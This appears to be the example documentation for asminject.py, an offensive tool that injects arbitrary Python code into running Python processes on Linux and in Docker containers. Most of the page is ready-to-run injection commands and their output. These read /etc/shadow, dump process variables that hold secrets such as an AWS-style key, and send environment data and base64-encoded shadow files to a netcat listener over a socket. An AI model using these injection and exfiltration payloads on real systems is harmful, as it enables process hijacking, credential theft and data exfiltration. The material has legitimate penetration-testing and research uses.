# asminject.py examples - Python
* [Execute arbitrary Python code inside an existing Python 3 process](#execute-arbitrary-python-code-inside-an-existing-python-3-process)
* [Execute arbitrary Python code inside an existing Python 2 process](#execute-arbitrary-python-code-inside-an-existing-python-2-process)
* [Write all global or variables to standard out](#write-all-global-or-local-variables-to-standard-out)
* [Interact with a container only via injected Python code](#interact-with-a-container-only-via-injected-python-code)

## Important

For all Python 3 examples, refer to the <a href="docs/specialized_options.md#specifying-non-pic-code">position-independent code discussion in the specialized options document</a>. Python 3 before 3.10 is usually not position-independent, but Python 3.10 and later usually are.

## Execute arbitrary Python code inside an existing Python 3 process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data.

```
$ sudo python3 practice/python_loop.py

2022-05-12T19:46:46.245462 - Loop count 0
2022-05-12T19:46:51.253640 - Loop count 1
2022-05-12T19:46:56.264897 - Loop count 2
```

In a separate terminal, locate the process and inject some arbitrary Python code into it. Note the use of the `--non-pic-binary` option discussed in <a href="docs/specialized_options.md#specifying-non-pic-code">specialized options</a>, as this is required for Python 3.9 specifically on most(?) x86-64 Linux distributions. For other Python versions, you may or may not need to exclude the option.

This payload requires one variable: `pythoncode`, which should contain the Python script code to execute in the existing Python process.

```
# python3 ./asminject.py 2037475 execute_python_code.s \
   --relative-offsets-from-binaries \
   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
   --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
   
...omitted for brevity...
```

Verify that the file has been copied:

```
# cat /tmp/bishopfox.txt 

root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
```

## Execute arbitrary Python code inside an existing Python 2 process

If you're targeting a legacy Python 2 process instead of Python 3, you'll most likely need to omit the `--non-pic-binary` option, e.g. same as the previous example, except:

```
# python3 ./asminject.py 2144294 execute_python_code.s \
   --relative-offsets-from-binaries \
   --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
```

## Write all global or local variables to standard out

Use [the following Python code, which was based on this Stack Overflow discussion](https://stackoverflow.com/questions/633127/viewing-all-defined-variables)

Global variables:

```
tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]
```


Local variables:

```
tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]
```

e.g.

```
# python3 ./asminject.py 249594 execute_python_code.s \
   --relative-offsets-from-binaries \
   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
   --var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
```

or

```
# python3 ./asminject.py 249594 execute_python_code.s \
   --relative-offsets-from-binaries \
   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
   --var pythoncode "tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
```

Example output:

```
2022-06-09T23:08:56.301925 - Loop count 107
time   :   <module 'time' (built-in)>  type: <class 'module'>
datetime   :   <module 'datetime' from '/usr/lib/python3.9/datetime.py'>  type: <class 'module'>
example_global_var_1   :   AKIASADF9370235SUAS0  type: <class 'str'>
example_global_var_2   :   This value should not be disclosed  type: <class 'str'>
i   :   107  type: <class 'int'>
v   :   time  type: <class 'str'>
2022-06-09T23:09:05.310443 - Loop count 108
```

## Interact with a container only via injected Python code

This scenario simulates a container that either does not allow access to an interactive shell, or use of the interactive shell would trigger an unwanted response.

Start a Python 3 process in a Docker container:
```
# docker run -v $(pwd)/practice/python_loop.py:/tmp/python_loop.py \
   --network=host -ti fedora

latest: Pulling from library/fedora
e1deda52ffad: Pull complete 
...omitted for brevity...
[root@3a78fa62ff5b /]# python3 /tmp/python_loop.py 
2022-06-29T21:30:19.037816 - Loop count 0
2022-06-29T21:30:24.043250 - Loop count 1
```

Locate the process ID for the Python process, then get a list of the binaries it has loaded:

```
# ps auxww | grep python                  

...omitted for brevity...
root     2378331  [...] python3 /tmp/python_loop.py

# cat /proc/2378331/maps

556d84513000-556d84514000 r--p [...] /usr/bin/python3.10
...omitted for brevity...
7f8483e8b000-7f8483ee4000 r--p [...] /usr/lib64/libpython3.10.so.1.0
...omitted for brevity...
```

Copy any necessary binaries out of the container and generate offsets from them. For example:

```
# docker cp 3a78fa62ff5b:/usr/bin/python3.10 ./docker-fedora-python3.10

# docker cp 3a78fa62ff5b:/usr/lib64/libpython3.10.so.1.0 ./docker-fedora-libpython3.10

# ./get_relative_offsets.sh docker-fedora-python3.10 > relative-offsets-docker-fedora-python3.10.txt

# ./get_relative_offsets.sh docker-fedora-libpython3.10 > relative-offsets-docker-fedora-libpython3.10.txt
```

Inject the Python code into the target process using the `execute_python_code.s` payload, e.g.:

```
# python3 ./asminject.py 2378331 execute_python_code.s \
	--arch x86-64 \
	--relative-offsets relative-offsets-docker-fedora-python3.10.txt \
	--relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
	--stop-method "slow" \
	--var pythoncode 'import os; print(os.environ);'
```

This should generate output in the terminal where the container was launched, e.g.:

```
2022-06-29T21:53:35.027900 - Loop count 278
environ({'HOSTNAME': '3a78fa62ff5b', 'DISTTAG': 'f36container', 'PWD': '/', 'FBR': 'f36', 'HOME': '/root',
...omitted for brevity...
'PATH': '/root/.local/bin:/root/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', '_': '/usr/bin/python3'})
2022-06-29T21:53:44.063159 - Loop count 279
```

To simulate a situation where the console is not visible, you can send Python code that will return the output to a TCP listener, e.g.:

```
% nc -nvlkp 7777
listening on [any] 7777 ...
```

Then, in another terminal:

```
# python3 ./asminject.py 2378331 execute_python_code.s \
   --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
   --var pythoncode 'import os; import socket; s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(f\"{os.environ}\".encode()); s.close()'
```

You should see the output in the `nc` listener, e.g.:

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45528
environ({'HOSTNAME': 'copyroom', 'DISTTAG': 'f36container', 'PWD': '/', 'FBR': 'f36', 'HOME': '/root',
...omitted for brevity...
'PATH': '/root/.local/bin:/root/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', '_': '/usr/bin/python3'}
```

Copy a file out of the container:

```
# python3 ./asminject.py 2378331 execute_python_code.s \
   --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
   --var pythoncode 'import base64; import os; import socket; f = open(\"/etc/shadow\", mode=\"rb\"); content = f.read(); f.close(); encoded = base64.b64encode(content); s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(encoded); s.close();'
```

The base64-encoded version should appear in the netcat listener:

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45530
cm9vdDohbG9ja2VkOjowOjk5O...omitted for brevity...
```